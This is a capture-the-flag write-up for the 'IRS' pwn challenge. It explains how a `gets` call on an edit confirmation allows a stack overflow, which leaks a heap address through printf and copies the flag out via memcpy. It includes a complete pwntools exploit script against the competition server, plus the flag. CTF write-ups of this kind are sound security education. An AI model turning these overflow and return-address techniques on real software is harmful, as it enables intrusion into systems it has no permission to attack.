## IRS (PWN 100)

by droofe

When running the binary, I started by noticing that Mr. Trumps tax return was already filed. Hm? Lets go ahead and try to open it!

Password protected... okay awesome. After messing around and filing a few tax returns on my own, the program complained after I had made four additional returns, saying "blah blah blah, if this problem persists call us at 0xf7d35678". 

WOW! A free leak already. So, I decided to drop the binary into IDA and see what I was dealing with.

After some analysis, I saw that the binary started off and malloc'ed a space for Donald Trumps tax return and put the flag as the password. Awesome, goal: find the password to his tax return.

### Vulnerability
The vulnerability comes into play if you try to edit your tax return. After editing the tax return, it asks you to confirm, prompting you for [y/n], which is read in by none other than `gets`. Turns out the pointer given above was a pointer to the spot on the stack that holds the malloc'ed address of Trumps Tax return. Using the gets stack control, I used printf to leak that address with my first edit, and then memcpy to move the password to the name field with the second edit.

```python
from pwn import *
from time import sleep

s = 0

def fileReturn(name, password, income, deduc):
	s.sendline("1")
	for item in [name, password, income, deduc]:
		s.recvuntil(": ")
		s.sendline(item)
	garbage = s.recvuntil("!")
	menu = s.recv(1024)

def editReturn(name, password, income, deduc, payload, time=1):
	s.sendline("3")
	for item in [name, password, income, deduc]:
		s.recvuntil(": ")
		s.sendline(item)
	for item in payload:
		s.send(item)
	s.sendline("")
	s.recvuntil("recorded!")
	s.recv(2)

	if time==1:
		return int(s.recvuntil("\n")[:4][::-1].encode('hex'),16)

def getStackAddress():
	s.sendline("1")
	s.recvuntil(": ")
	address = int((s.recvuntil("\n").strip()[2::]),16)
	menu = s.recv(1024)
	return address

#s = process("./irs", env={"LD_LIBRARY_PATH": "."})
s = remote("irs.pwn.republican", 4127)
#e = ELF("./irs")

#raw_input("Waiting...")

menu = s.recv(1024)

fileReturn("edwood", "password1", "100", "100")
fileReturn("edwood", "password2", "100", "100")
fileReturn("edwood", "password3", "100", "100")
fileReturn("edwood", "password4", "100", "100")

stackAddr = getStackAddress()
ebp = stackAddr + 0x30
log.info("Stack address {:x}".format(stackAddr))
log.info("EBP address {:x}".format(ebp))

payload = ['A'*21,
			p32(ebp),
			p32(0x080484D0), #call to printf
			p32(0x08048AFD),  #call to main
			p32(stackAddr),
			]

my_heapaddr = editReturn("edwood", "password1", "100", "100", payload)

their_heapaddr_name = my_heapaddr
their_heapaddr_flag = their_heapaddr_name + 50

log.info("Name at {:x}".format(their_heapaddr_name))
log.info("Flag at {:x}".format(their_heapaddr_flag))

payload = ['A'*21,
			p32(ebp),
			p32(0x08048528),
			p32(0x08048AFD),
			p32(their_heapaddr_name),
			p32(their_heapaddr_flag),
			p32(50)
			]


editReturn("edwood", "password1", "100", "100", payload, time=2)
s.interactive()


# flag{c4n_1_g3t_a_r3fund}
```
